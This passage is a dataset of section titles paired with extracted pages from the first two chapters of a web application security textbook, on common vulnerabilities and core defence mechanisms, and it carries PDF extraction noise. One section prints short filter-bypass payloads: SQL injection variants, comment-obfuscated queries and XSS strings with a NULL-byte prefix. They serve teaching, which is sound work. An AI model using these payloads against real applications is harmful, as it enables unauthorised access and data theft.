itself.\ncc0011..iinndddd 77 88//1199//22001111 1122::0022::0033 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 8\n8 Chapter 1 n Web Application (In)security\nn Cross-site scripting (94%) — This vulnerability enables an attacker to\ntarget other users of the application, potentially gaining access to their\ndata, performing unauthorized actions on their behalf, or carrying out\nother attacks against them.\nn Information leakage (78%) — This involves cases where an application\ndivulges sensitive information that is of use to an attacker in developing\nan assault against the application, through defective error handling or\nother behavior.\nn Cross-site request forgery (92%) — This fl aw means that application\nusers can be induced to perform unintended actions on the application\nwithin their user context and privilege level. The vulnerability allows a\nmalicious web site visited by the victim user to interact with the applica-\ntion to perform actions that the user did not intend.\nBroken authentication 62%\nBroken access controls 71%\nSQL injection 32%\nCross-site scripting 94%\nInformation leakage 78%\nCross-site request\n92%\nforgery\n0% 10% 20% 30% 40% 50% 60% 70% 80% 90% 100%\nIncidence in recently tested applications\nFigure 1-3: The incidence of some common web application vulnerabilities in\napplications recently tested by the authors (based on a sample of more than 100)\nSSL is an excellent technology that protects the confi dentiality and integrity\nof data in transit between the user’s browser and the web server. It helps defend\nagainst eavesdroppers, and it can provide assurance to the user of the identity of\nthe web server he is dealing with. But it does not stop attacks that directly target\nthe server or client components of an application, as most successful attacks do.\nSpecifi cally, it does not prevent any of the vulnerabilities just listed, or many\nothers that can render an application critically exposed to attack. Regardless of\nwhether they use SSL, most web applications still contain security fl aws.\ncc0011..iinndddd 88 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "The Core Security Problem: Users Can Submit Arbitrary Input",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 9\nChapter 1 n Web Application (In)security 9\nThe Core Security Problem: Users Can Submit\nArbitrary Input\nAs with most distributed applications, web applications face a fundamental\nproblem they must address to be secure. Because the client is outside of the\napplication’s control, users can submit arbitrary input to the server-side appli-\ncation. The application must assume that all input is potentially malicious.\nTherefore, it must take steps to ensure that attackers cannot use crafted input\nto compromise the application by interfering with its logic and behavior, thus\ngaining unauthorized access to its data and functionality.\nThis core problem manifests itself in various ways:\nn Users can interfere with any piece of data transmitted between the client\nand the server, including request parameters, cookies, and HTTP head-\ners. Any security controls implemented on the client side, such as input\nvalidation checks, can be easily circumvented.\nn Users can send requests in any sequence and can submit parameters at a\ndifferent stage than the application expects, more than once, or not at all.\nAny assumption developers make about how users will interact with the\napplication may be violated.\nn Users are not restricted to using only a web browser to access the application.\nNumerous widely available tools operate alongside, or independently of,\na browser to help attack web applications. These tools can make requests\nthat no browser would ordinarily make and can generate huge numbers\nof requests quickly to fi nd and exploit problems.\nThe majority of attacks against web applications involve sending input to the\nserver that is crafted to cause some event that was not expected or desired by\nthe application’s designer. Here are some examples of submitting crafted input\nto achieve this objective:\nn Changing the price of a product transmitted in a hidden HTML form fi eld\nto fraudulently purchase the product for a cheaper amount\nn Modifying a session token transmitted in an HTTP cookie to hijack the\nsession of another authenticated user\nn Removing certain parameters that normally are submitted to exploit a\nlogic fl aw in the application’s processing\nn Altering some input that will be processed by a back-end database to inject\na malicious database query and access sensitive data\nNeedless to say, SSL does nothing to stop an attacker from submitting crafted\ninput to the server. If the application uses SSL, this simply means that other users\non the network cannot view or modify the attacker’s data in transit. Because\ncc0011..iinndddd 99 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "Key Problem Factors",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 10\n10 Chapter 1 n Web Application (In)security\nthe attacker controls her end of the SSL tunnel, she can send anything she likes\nto the server through this tunnel. If any of the previously mentioned attacks\nare successful, the application is emphatically vulnerable, regardless of what\nits FAQ may tell you.\nKey Problem Factors\nThe core security problem faced by web applications arises in any situation\nwhere an application must accept and process untrusted data that may be mali-\ncious. However, in the case of web applications, several factors have combined\nto exacerbate the problem and explain why so many web applications on the\nInternet today do such a poor job of addressing it.\nUnderdeveloped Security Awareness\nAlthough awareness of web application security issues has grown in recent\nyears, it remains less well-developed than in longer-established areas such as\nnetworks and operating systems. Although most people working in IT security\nhave a reasonable grasp of the essentials of securing networks and hardening\nhosts, widespread confusion and misconception still exist about many of the\ncore concepts involved in web application security. A web application devel-\noper’s work increasingly involves weaving together tens, or even hundreds,\nof third-party packages, all designed to abstract the developer away from the\nunderlying technologies. It is common to meet experienced web application\ndevelopers who make major assumptions about the security provided by their\nprogramming framework and to whom an explanation of many basic types of\nfl aws comes as a revelation.\nCustom Development\nMost web applications are developed in-house by an organization’s own staff\nor third-party contractors. Even where an application employs well-established\ncomponents, these are typically customized or bolted together using new code.\nIn this situation, every application is different and may contain its own unique\ndefects. This stands in contrast to a typical infrastructure deployment, in which\nan organization can purchase a best-of-breed product and install it in line with\nindustry-standard guidelines.\nDeceptive Simplicity\nWith today’s web application platforms and development tools, it is possible for\na novice programmer to create a powerful application from scratch in a short\nperiod of time. But there is a huge difference between producing code that is\ncc0011..iinndddd 1100 88//1199//22001111 1122::0022::0033 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 11\nChapter 1 n Web Application (In)security 11\nfunctional and code that is secure. Many web applications are created by well-\nmeaning individuals who simply lack the knowledge and experience to identify\nwhere security problems may arise.\nA prominent trend in recent years has been the use of application frameworks\nthat provide ready-made code components to handle numerous common areas\nof functionality, such as authentication, page templates, message boards, and\nintegration with common back-end infrastructure components. Examples of these\nframeworks include Liferay and Appfuse. These products make it quick and\neasy to create working applications without requiring a technical understanding\nof how the applications work or the potential risks they may contain. This also\nmeans many companies use the same frameworks. Thus, when a vulnerability\nis discovered, it affects many unrelated applications.\nRapidly Evolving Threat Profi le\nResearch into web application attacks and defenses continues to be a thriving\narea in which new concepts and threats are conceived at a faster rate than is now\nthe case for older technologies. Particularly on the client side, it is common for\nthe accepted defenses against a particular attack to be undermined by research\nthat demonstrates a new attack technique. A development team that begins a\nproject with a complete knowledge of current threats may have lost this status\nby the time the application is completed and deployed.\nResource and Time Constraints\nMost web application development projects are subject to strict constraints on\ntime and resources, arising from the economics of in-house, one-off develop-\nment. In most organizations, it is often infeasible to employ dedicated security\nexpertise in the design or development teams. And due to project slippage,\nsecurity testing by specialists is often left until very late in the project’s life\ncycle. In the balancing of competing priorities, the need to produce a stable and\nfunctional application by a deadline normally overrides less tangible security\nconsiderations. A typical small organization may be willing to pay for only a\nfew man-days of consulting time to evaluate a new application. A quick pen-\netration test will often fi nd the low-hanging fruit, but it may miss more subtle\nvulnerabilities that require time and patience to identify.\nOverextended Technologies\nMany of the core technologies employed in web applications began life when\nthe landscape of the World Wide Web was very different. They have since been\npushed far beyond the purposes for which they were originally conceived, such\nas the use of JavaScript as a means of data transmission in many AJAX-based\ncc0011..iinndddd 1111 88//1199//22001111 1122::0022::0033 PPMM"
  },
  {
    "input": "The New Security Perimeter",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 12\n12 Chapter 1 n Web Application (In)security\napplications. As the expectations placed on web application functionality have\nrapidly evolved, the technologies used to implement this functionality have\nlagged behind the curve, with old technologies stretched and adapted to meet\nnew requirements. Unsurprisingly, this has led to security vulnerabilities as\nunforeseen side effects emerge.\nIncreasing Demands on Functionality\nApplications are designed primarily with functionality and usability in mind.\nOnce-static user profi les now contain social networking features, allowing upload-\ning of pictures and wiki-style editing of pages. A few years ago an application\ndesigner may have been content with implementing a username and password\nchallenge to create the login functionality. Modern sites may include password\nrecovery, username recovery, password hints, and an option to remember the\nusername and password on future visits. Such a site would undoubtedly be\npromoted as having numerous security features, yet each one is really a self-\nservice feature adding to the site’s attack surface.\nThe New Security Perimeter\nBefore the rise of web applications, organizations’ efforts to secure themselves\nagainst external attack were largely focused on the network perimeter. Defending\nthis perimeter entailed hardening and patching the services it needed to expose\nand fi rewalling access to others.\nWeb applications have changed all this. For an application to be accessible\nby its users, the perimeter fi rewall must allow inbound connections to the\nserver over HTTP or HTTPS. And for the application to function, the server\nmust be allowed to connect to supporting back-end systems, such as databases,\nmainframes, and fi nancial and logistical systems. These systems often lie at\nthe core of the organization’s operations and reside behind several layers of\nnetwork-level defenses.\nIf a vulnerability exists within a web application, an attacker on the public\nInternet may be able to compromise the organization’s core back-end systems\nsolely by submitting crafted data from his web browser. This data sails past all\nthe organization’s network defenses, in the same way as does ordinary, benign\ntraffi c to the web application.\nThe effect of widespread deployment of web applications is that the security\nperimeter of a typical organization has moved. Part of that perimeter is still\nembodied in fi rewalls and bastion hosts. But a signifi cant part of it is now occupied\nby the organization’s web applications. Because of the manifold ways in which\nweb applications receive user input and pass this to sensitive back-end systems,\nthey are the potential gateways for a wide range of attacks, and defenses against\nthese attacks must be implemented within the applications themselves. A single\ncc0011..iinndddd 1122 88//1199//22001111 1122::0022::0044 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 13\nChapter 1 n Web Application (In)security 13\nline of defective code in a single web application can render an organization’s\ninternal systems vulnerable. Furthermore, with the rise of mash-up applications,\nthird-party widgets, and other techniques for cross-domain integration, the\nserver-side security perimeter frequently extends well beyond the organization\nitself. Implicit trust is placed in the services of external applications and services.\nThe statistics described previously, of the incidence of vulnerabilities within\nthis new security perimeter, should give every organization pause for thought.\nNOTE For an attacker targeting an organization, gaining access to the net-\nwork or executing arbitrary commands on servers may not be what he wants\nto achieve. Often, and perhaps typically, what an attacker really wants is to\nperform some application-level action such as stealing personal informa-\ntion, transferring funds, or making cheap purchases. And the relocation of the\nsecurity perimeter to the application layer may greatly assist an attacker in\nachieving these objectives.\nFor example, suppose that an attacker wants to “hack in” to a bank’s systems\nand steal money from users’ accounts. In the past, before the bank deployed\na web application, the attacker might have needed to fi nd a vulnerability\nin a publicly reachable service, exploit this to gain a toehold on the bank’s\nDMZ, penetrate the fi rewall restricting access to its internal systems, map the\nnetwork to fi nd the mainframe computer, decipher the arcane protocol used\nto access it, and guess some credentials to log in. However, if the bank now\ndeploys a vulnerable web application, the attacker may be able to achieve the\nsame outcome simply by modifying an account number in a hidden fi eld of an\nHTML form.\nA second way in which web applications have moved the security perimeter\narises from the threats that users themselves face when they access a vulner-\nable application. A malicious attacker can leverage a benign but vulnerable web\napplication to attack any user who visits it. If that user is located on an internal\ncorporate network, the attacker may harness the user’s browser to launch an\nattack against the local network from the user’s trusted position. Without any\ncooperation from the user, the attacker may be able to carry out any action that\nthe user could perform if she were herself malicious. With the proliferation of\nbrowser extension technologies and plug-ins, the extent of the client-side attack\nsurface has increased considerably.\nNetwork administrators are familiar with the idea of preventing their users\nfrom visiting malicious web sites, and end users themselves are gradually becom-\ning more aware of this threat. But the nature of web application vulnerabilities\nmeans that a vulnerable application may present no less of a threat to its users\nand their organization than a web site that is overtly malicious. Correspondingly,\nthe new security perimeter imposes a duty of care on all application owners\nto protect their users from attacks against them delivered via the application.\ncc0011..iinndddd 1133 88//1199//22001111 1122::0022::0044 PPMM"
  },
  {
    "input": "The Future of Web Application Security",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 14\n14 Chapter 1 n Web Application (In)security\nA further way in which the security perimeter has partly moved to the cli-\nent side is through the widespread use of e-mail as an extended authentication\nmechanism. A huge number of today’s applications contain “forgotten password”\nfunctions that allow an attacker to generate an account recovery e-mail to any\nregistered address, without requiring any other user-specifi c information. This\nallows an attacker who compromises a user’s web mail account to easily escalate\nthe attack and compromise the victim’s accounts on most of the web applications\nfor which the victim is registered.\nThe Future of Web Application Security\nOver a decade after their widespread adoption, web applications on the Internet\ntoday are still rife with vulnerabilities. Understanding of the security threats\nfacing web applications, and effective ways of addressing these, are still underde-\nveloped within the industry. There is currently little indication that the problem\nfactors described in this chapter will disappear in the near future.\nThat said, the details of the web application security landscape are not static.\nEven though old and well-understood vulnerabilities such as SQL injection\ncontinue to appear, their prevalence is gradually diminishing. Furthermore,\nthe instances that remain are becoming more diffi cult to fi nd and exploit. New\nresearch in these areas is generally focused on developing advanced techniques\nfor attacking more subtle manifestations of vulnerabilities that a few years ago\ncould be easily detected and exploited using only a browser.\nA second prominent trend has been a gradual shift in attention from attacks\nagainst the server side of the application to those that target application users.\nThe latter kind of attack still leverages defects within the application itself, but\nit generally involves some kind of interaction with another user to compromise\nthat user’s dealings with the vulnerable application. This is a trend that has\nbeen replicated in other areas of software security. As awareness of security\nthreats matures, fl aws in the server side are the fi rst to be well understood and\naddressed, leaving the client side as a key battleground as the learning process\ncontinues. Of all the attacks described in this book, those against other users\nare evolving the most quickly, and they have been the focus of most research\nin recent years.\nVarious recent trends in technology have somewhat altered the landscape of\nweb applications. Popular consciousness about these trends exists by means of\nvarious rather misleading buzzwords, the most prominent of which are these:\nn Web 2.0 — This term refers to the greater use of functionality that enables\nuser-generated content and information sharing, and also the adoption\nof various technologies that broadly support this functionality, including\nasynchronous HTTP requests and cross-domain integration.\ncc0011..iinndddd 1144 88//1199//22001111 1122::0022::0044 PPMM"
  },
  {
    "input": "Summary",
    "output": "Stuttard c01.indd V2 - 07/07/2011 Page 15\nChapter 1 n Web Application (In)security 15\nn Cloud computing — This term refers to greater use of external service\nproviders for various parts of the technology stack, including applica-\ntion software, application platforms, web server software, databases, and\nhardware. It also refers to increased usage of virtualization technologies\nwithin hosting environments.\nAs with most changes in technology, these trends have brought with them\nsome new attacks and variations on existing attacks. Notwithstanding the hype,\nthe issues raised are not quite as revolutionary as they may initially appear. We\nwill examine the security implications of these and other recent trends in the\nappropriate locations throughout this book.\nDespite all the changes that have occurred within web applications, some\ncategories of “classic” vulnerabilities show no sign of diminishing. They continue\nto arise in pretty much the same form as they did in the earliest days of the\nweb. These include defects in business logic, failures to properly apply access\ncontrols, and other design issues. Even in a world of bolted-together applica-\ntion components and everything-as-a-service, these timeless issues are likely\nto remain widespread.\nSummary\nIn a little over a decade, the World Wide Web has evolved from purely static\ninformation repositories into highly functional applications that process sensitive\ndata and perform powerful actions with real-world consequences. During this\ndevelopment, several factors have combined to bring about the weak security\nposture demonstrated by the majority of today’s web applications.\nMost applications face the core security problem that users can submit arbi-\ntrary input. Every aspect of the user’s interaction with the application may be\nmalicious and should be regarded as such unless proven otherwise. Failure to\nproperly address this problem can leave applications vulnerable to attack in\nnumerous ways.\nAll the evidence about the current state of web application security indicates\nthat although some aspects of security have indeed improved, entirely new\nthreats have evolved to replace them. The overall problem has not been resolved\non any signifi cant scale. Attacks against web applications still present a serious\nthreat to both the organizations that deploy them and the users who access them.\ncc0011..iinndddd 1155 88//1199//22001111 1122::0022::0044 PPMM\nStuttard c01.indd V2 - 07/07/2011 Page 16\ncc0011..iinndddd 1166 88//1199//22001111 1122::0022::0044 PPMM"
  },
  {
    "input": "Chapter 2 Core Defense Mechanisms",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 17\nCHAPTER\n2\nCore Defense Mechanisms\nThe fundamental security problem with web applications — that all user input\nis untrusted — gives rise to a number of security mechanisms that applica-\ntions use to defend themselves against attack. Virtually all applications employ\nmechanisms that are conceptually similar, although the details of the design\nand the effectiveness of the implementation vary greatly.\nThe defense mechanisms employed by web applications comprise the following\ncore elements:\nn Handling user access to the application’s data and functionality to prevent\nusers from gaining unauthorized access\nn Handling user input to the application’s functions to prevent malformed\ninput from causing undesirable behavior\nn Handling attackers to ensure that the application behaves appropriately\nwhen being directly targeted, taking suitable defensive and offensive\nmeasures to frustrate the attacker\nn Managing the application itself by enabling administrators to monitor its\nactivities and confi gure its functionality\nBecause of their central role in addressing the core security problem, these\nmechanisms also make up the vast majority of a typical application’s attack\nsurface. If knowing your enemy is the fi rst rule of warfare, then understanding\nthese mechanisms thoroughly is the main prerequisite for being able to attack\n17\ncc0022..iinndddd 1177 88//1199//22001111 1122::0022::4411 PPMM"
  },
  {
    "input": "Authentication",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 18\n18 Chapter 2 n Core Defense Mechanisms\napplications effectively. If you are new to hacking web applications (and even\nif you are not), you should be sure to take time to understand how these core\nmechanisms work in each of the applications you encounter, and identify the\nweak points that leave them vulnerable to attack.\nHandling User Access\nA central security requirement that virtually any application needs to meet is\ncontrolling users’ access to its data and functionality. A typical situation has\nseveral different categories of user, such as anonymous users, ordinary authenti-\ncated users, and administrative users. Furthermore, in many situations different\nusers are permitted to access a different set of data. For example, users of a web\nmail application should be able to read their own e-mail but not other people’s.\nMost web applications handle access using a trio of interrelated security\nmechanisms:\nn Authentication\nn Session management\nn Access control\nEach of these mechanisms represents a signifi cant area of an application’s\nattack surface, and each is fundamental to an application’s overall security\nposture. Because of their interdependencies, the overall security provided by\nthe mechanisms is only as strong as the weakest link in the chain. A defect in\nany single component may enable an attacker to gain unrestricted access to the\napplication’s functionality and data.\nAuthentication\nThe authentication mechanism is logically the most basic dependency in an\napplication’s handling of user access. Authenticating a user involves establishing\nthat the user is in fact who he claims to be. Without this facility, the application\nwould need to treat all users as anonymous — the lowest possible level of trust.\nThe majority of today’s web applications employ the conventional authen-\ntication model, in which the user submits a username and password, which\nthe application checks for validity. Figure 2-1 shows a typical login function.\nIn security-critical applications such as those used by online banks, this basic\nmodel is usually supplemented by additional credentials and a multistage login\nprocess. When security requirements are higher still, other authentication mod-\nels may be used, based on client certifi cates, smartcards, or challenge-response\ntokens. In addition to the core login process, authentication mechanisms often\nemploy a range of other supporting functionality, such as self-registration,\naccount recovery, and a password change facility.\ncc0022..iinndddd 1188 88//1199//22001111 1122::0022::4411 PPMM"
  },
  {
    "input": "Session Management",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 19\nChapter 2 n Core Defense Mechanisms 19\nFigure 2-1: A typical login function\nDespite their superfi cial simplicity, authentication mechanisms suffer from a\nwide range of defects in both design and implementation. Common problems\nmay enable an attacker to identify other users’ usernames, guess their pass-\nwords, or bypass the login function by exploiting defects in its logic. When\nyou are attacking a web application, you should invest a signifi cant amount of\nattention to the various authentication-related functions it contains. Surprisingly\nfrequently, defects in this functionality enable you to gain unauthorized access\nto sensitive data and functionality.\nSession Management\nThe next logical task in the process of handling user access is to manage the\nauthenticated user’s session. After successfully logging in to the application, the\nuser accesses various pages and functions, making a series of HTTP requests from\nhis browser. At the same time, the application receives countless other requests\nfrom different users, some of whom are authenticated and some of whom are\nanonymous. To enforce effective access control, the application needs a way to\nidentify and process the series of requests that originate from each unique user.\nVirtually all web applications meet this requirement by creating a session for\neach user and issuing the user a token that identifi es the session. The session\nitself is a set of data structures held on the server that track the state of the user’s\ninteraction with the application. The token is a unique string that the applica-\ntion maps to the session. When a user receives a token, the browser automati-\ncally submits it back to the server in each subsequent HTTP request, enabling\nthe application to associate the request with that user. HTTP cookies are the\nstandard method for transmitting session tokens, although many applications\nuse hidden form fi elds or the URL query string for this purpose. If a user does\nnot make a request for a certain amount of time, the session is ideally expired,\nas shown in Figure 2-2.\ncc0022..iinndddd 1199 88//1199//22001111 1122::0022::4411 PPMM"
  },
  {
    "input": "Access Control",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 20\n20 Chapter 2 n Core Defense Mechanisms\nFigure 2-2: An application enforcing session timeout\nIn terms of attack surface, the session management mechanism is highly\ndependent on the security of its tokens. The majority of attacks against it seek to\ncompromise the tokens issued to other users. If this is possible, an attacker can\nmasquerade as the victim user and use the application just as if he had actually\nauthenticated as that user. The principal areas of vulnerability arise from defects\nin how tokens are generated, enabling an attacker to guess the tokens issued to\nother users, and defects in how tokens are subsequently handled, enabling an\nattacker to capture other users’ tokens.\nA small number of applications dispense with the need for session tokens by\nusing other means of reidentifying users across multiple requests. If HTTP’s\nbuilt-in authentication mechanism is used, the browser automatically resubmits\nthe user’s credentials with each request, enabling the application to identify the\nuser directly from these. In other cases, the application stores the state infor-\nmation on the client side rather than the server, usually in encrypted form to\nprevent tampering.\nAccess Control\nThe fi nal logical step in the process of handling user access is to make and enforce\ncorrect decisions about whether each individual request should be permitted or\ndenied. If the mechanisms just described are functioning correctly, the applica-\ntion knows the identity of the user from whom each request is received. On this\nbasis, it needs to decide whether that user is authorized to perform the action,\nor access the data, that he is requesting, as shown in Figure 2-3.\nThe access control mechanism usually needs to implement some fi ne-grained\nlogic, with different considerations being relevant to different areas of the\napplication and different types of functionality. An application might support\nnumerous user roles, each involving different combinations of specifi c privileges.\nIndividual users may be permitted to access a subset of the total data held within\nthe application. Specifi c functions may implement transaction limits and other\nchecks, all of which need to be properly enforced based on the user’s identity.\nBecause of the complex nature of typical access control requirements, this\nmechanism is a frequent source of security vulnerabilities that enable an attacker\ncc0022..iinndddd 2200 88//1199//22001111 1122::0022::4422 PPMM"
  },
  {
    "input": "Varieties of Input",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 21\nChapter 2 n Core Defense Mechanisms 21\nto gain unauthorized access to data and functionality. Developers often make\nfl awed assumptions about how users will interact with the application and\nfrequently make oversights by omitting access control checks from some appli-\ncation functions. Probing for these vulnerabilities is often laborious, because\nessentially the same checks need to be repeated for each item of functionality.\nBecause of the prevalence of access control fl aws, however, this effort is always\na worthwhile investment when you are attacking a web application. Chapter\n8 describes how you can automate some of the effort involved in performing\nrigorous access control testing.\nFigure 2-3: An application enforcing access control\nHandling User Input\nRecall the fundamental security problem described in Chapter 1: All user input\nis untrusted. A huge variety of attacks against web applications involve submit-\nting unexpected input, crafted to cause behavior that was not intended by the\napplication’s designers. Correspondingly, a key requirement for an application’s\nsecurity defenses is that the application must handle user input in a safe manner.\nInput-based vulnerabilities can arise anywhere within an application’s func-\ntionality, and in relation to practically every type of technology in common use.\n“Input validation” is often cited as the necessary defense against these attacks.\nHowever, no single protective mechanism can be employed everywhere, and\ndefending against malicious input is often not as straightforward as it sounds.\nVarieties of Input\nA typical web application processes user-supplied data in many different forms.\nSome kinds of input validation may not be feasible or desirable for all these\nforms of input. Figure 2-4 shows the kind of input validation often performed\nby a user registration function.\ncc0022..iinndddd 2211 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 22\n22 Chapter 2 n Core Defense Mechanisms\nMust contain at least 4 characters\nMust contain at least 4 characters\nPlease provide a valid email address\nMust contain only numbers\nFigure 2-4: An application performing input validation\nIn many cases, an application may be able to impose very stringent valida-\ntion checks on a specifi c item of input. For example, a username submitted to a\nlogin function may be required to have a maximum length of eight characters\nand contain only alphabetical characters.\nIn other cases, the application must tolerate a wider range of possible input.\nFor example, an address fi eld submitted to a personal details page might legiti-\nmately contain letters, numbers, spaces, hyphens, apostrophes, and other char-\nacters. However, for this item, restrictions still can be feasibly imposed. The data\nshould not exceed a reasonable length limit (such as 50 characters) and should\nnot contain any HTML markup.\nIn some situations, an application may need to accept arbitrary input from\nusers. For example, a user of a blogging application may create a blog whose\nsubject is web application hacking. Posts and comments made to the blog may\nquite legitimately contain explicit attack strings that are being discussed. The\napplication may need to store this input in a database, write it to disk, and display\nit back to users in a safe way. It cannot simply reject the input just because it\nlooks potentially malicious without substantially diminishing the application’s\nvalue to some of its user base.\nIn addition to the various kinds of input that users enter using the browser\ninterface, a typical application receives numerous items of data that began their\nlife on the server and that are sent to the client so that the client can transmit\nthem back to the server on subsequent requests. This includes items such as\ncookies and hidden form fi elds, which are not seen by ordinary users of the\napplication but which an attacker can of course view and modify. In these cases,\napplications can often perform very specifi c validation of the data received. For\nexample, a parameter might be required to have one of a specifi c set of known\nvalues, such as a cookie indicating the user’s preferred language, or to be in a\nspecifi c format, such as a customer ID number. Furthermore, when an applica-\ntion detects that server-generated data has been modifi ed in a way that is not\npossible for an ordinary user with a standard browser, this often indicates\nthat the user is attempting to probe the application for vulnerabilities. In these\ncc0022..iinndddd 2222 88//1199//22001111 1122::0022::4422 PPMM"
  },
  {
    "input": "Approaches to Input Handling",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 23\nChapter 2 n Core Defense Mechanisms 23\ncases, the application should reject the request and log the incident for potential\ninvestigation (see the “Handling Attackers” sectionlater in this chapter).\nApproaches to Input Handling\nVarious broad approaches are commonly taken to the problem of handling\nuser input. Different approaches are often preferable for different situations\nand different types of input, and a combination of approaches may sometimes\nbe desirable.\n“Reject Known Bad”\nThis approach typically employs a blacklist containing a set of literal strings or\npatterns that are known to be used in attacks. The validation mechanism blocks\nany data that matches the blacklist and allows everything else.\nIn general, this is regarded as the least effective approach to validating user\ninput, for two main reasons. First, a typical vulnerability in a web applica-\ntion can be exploited using a wide variety of input, which may be encoded or\nrepresented in various ways. Except in the simplest of cases, it is likely that a\nblacklist will omit some patterns of input that can be used to attack the applica-\ntion. Second, techniques for exploitation are constantly evolving. Novel methods\nfor exploiting existing categories of vulnerabilities are unlikely to be blocked\nby current blacklists.\nMany blacklist-based fi lters can be bypassed with almost embarrassing ease\nby making trivial adjustments to the input that is being blocked. For example:\nn IfSELECT is blocked, try SeLeCt\nn Ifor 1=1-- is blocked, try or 2=2--\nn If alert(‘xss’) is blocked, try prompt(‘xss’)\nIn other cases, fi lters designed to block specifi c keywords can be bypassed by\nusing nonstandard characters between expressions to disrupt the tokenizing\nperformed by the application. For example:\nSELECT/*foo*/username,password/*foo*/FROM/*foo*/users\n<img%09onerror=alert(1) src=a>\nFinally, numerous blacklist-based fi lters, particularly those implemented in\nweb application fi rewalls, have been vulnerable to NULL byte attacks. Because\nof the different ways in which strings are handled in managed and unmanaged\nexecution contexts, inserting a NULL byte anywhere before a blocked expression\ncan cause some fi lters to stop processing the input and therefore not identify\nthe expression. For example:\n%00<script>alert(1)</script>\ncc0022..iinndddd 2233 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 24\n24 Chapter 2 n Core Defense Mechanisms\nVarious other techniques for attacking web application fi rewalls are described\nin Chapter 18.\nNOTE Attacks that exploit the handling of NULL bytes arise in many areas\nof web application security. In contexts where a NULL byte acts as a string\ndelimiter, it can be used to terminate a fi lename or a query to some back-\nend component. In contexts where NULL bytes are tolerated and ignored\n(for example, within HTML in some browsers), arbitrary NULL bytes can be\ninserted within blocked expressions to defeat some blacklist-based fi lters.\nAttacks of this kind are discussed in detail in later chapters.\n“Accept Known Good”\nThis approach employs a whitelist containing a set of literal strings or patterns,\nor a set of criteria, that is known to match only benign input. The validation\nmechanism allows data that matches the whitelist and blocks everything else.\nFor example, before looking up a requested product code in the database, an\napplication might validate that it contains only alphanumeric characters and is\nexactly six characters long. Given the subsequent processing that will be done\non the product code, the developers know that input passing this test cannot\npossibly cause any problems.\nIn cases where this approach is feasible, it is regarded as the most effective\nway to handle potentially malicious input. Provided that due care is taken in\nconstructing the whitelist, an attacker will be unable to use crafted input to\ninterfere with the application’s behavior. However, in numerous situations an\napplication must accept data for processing that does not meet any reasonable\ncriteria for what is known to be “good.” For example, some people’s names contain\nan apostrophe or hyphen. These can be used in attacks against databases, but\nit may be a requirement that the application should permit anyone to register\nunder his or her real name. Hence, although it is often extremely effective, the\nwhitelist-based approach does not represent an all-purpose solution to the\nproblem of handling user input.\nSanitization\nThis approach recognizes the need to sometimes accept data that cannot be\nguaranteed as safe. Instead of rejecting this input, the application sanitizes it\nin various ways to prevent it from having any adverse effects. Potentially mali-\ncious characters may be removed from the data, leaving only what is known to\nbe safe, or they may be suitably encoded or “escaped” before further processing\nis performed.\nApproaches based on data sanitization are often highly effective, and in many\nsituations they can be relied on as a general solution to the problem of malicious\ncc0022..iinndddd 2244 88//1199//22001111 1122::0022::4422 PPMM"
  },
  {
    "input": "Boundary Validation",
    "output": "Stuttard c02.indd V3 - 07/22/2011 Page 25\nChapter 2 n Core Defense Mechanisms 25\ninput. For example, the usual defense against cross-site scripting attacks is to\nHTML-encode dangerous characters before these are embedded into pages of the\napplication (see Chapter 12). However, effective sanitization may be diffi cult to\nachieve if several kinds of potentially malicious data need to be accommodated\nwithin one item of input. In this situation, a boundary validation approach is\ndesirable, as described later.\nSafe Data Handling\nMany web application vulnerabilities arise because user-supplied data is pro-\ncessed in unsafe ways. Vulnerabilities often can be avoided not by validating\nthe input itself but by ensuring that the processing that is performed on it is\ninherently safe. In some situations, safe programming methods are available\nthat avoid common problems. For example, SQL injection attacks can be pre-\nvented through the correct use of parameterized queries for database access\n(see Chapter 9). In other situations, application functionality can be designed\nin such a way that inherently unsafe practices, such as passing user input to an\noperating system command interpreter, are avoided.\nThis approach cannot be applied to every kind of task that web applications\nneed to perform. But where it is available, it is an effective general approach to\nhandling potentially malicious input.\nSemantic Checks\nThe defenses described so far all address the need to defend the application against\nvarious kinds of malformed data whose content has been crafted to interfere\nwith the application’s processing. However, with some vulnerabilities the input\nsupplied by the attacker is identical to the input that an ordinary, nonmalicious\nuser may submit. What makes it malicious is the different circumstances under\nwhich it is submitted. For example, an attacker might seek to gain access to\nanother user’s bank account by changing an account number transmitted in a\nhidden form fi eld. No amount of syntactic validation will distinguish between\nthe user’s data and the attacker’s. To prevent unauthorized access, the applica-\ntion needs to validate that the account number submitted belongs to the user\nwho has submitted it.\nBoundary Validation\nThe idea of validating data across trust boundaries is a familiar one. The core\nsecurity problem with web applications arises because data received from users\nis untrusted. Although input validation checks implemented on the client side\nmay improve performance and the user’s experience, they do not provide any\nassurance about the data that actually reaches the server. The point at which\ncc0022..iinndddd 2255 88//1199//22001111 1122::0022::4422 PPMM\nStuttard c02.indd V3 - 07/22/2011 Page 26\n26 Chapter 2 n Core Defense Mechanisms\nuser data is fi rst received by the server-side application represents a huge trust\nboundary. At this point the application needs to take measures to defend itself\nagainst malicious input.\nGiven the nature of the core problem, it is tempting to think of the input\nvalidation problem in terms of a frontier between the Internet, which is “bad”\nand untrusted, and the server-side application, which is “good” and trusted. In\nthis picture, the role of input validation is to clean potentially malicious data on\narrival and then pass the clean data to the trusted application. From this point\nonward, the data may be trusted and processed without any further checks or\nconcern about possible attacks.\nAs will become evident when we begin to examine some actual vulnerabili-\nties, this simple picture of input validation is inadequate for several reasons:\nn Given the wide range of functionality that applications implement, and the\ndifferent technologies in use, a typical application needs to defend itself\nagainst a huge variety of input-based attacks, each of which may employ\na diverse set of crafted 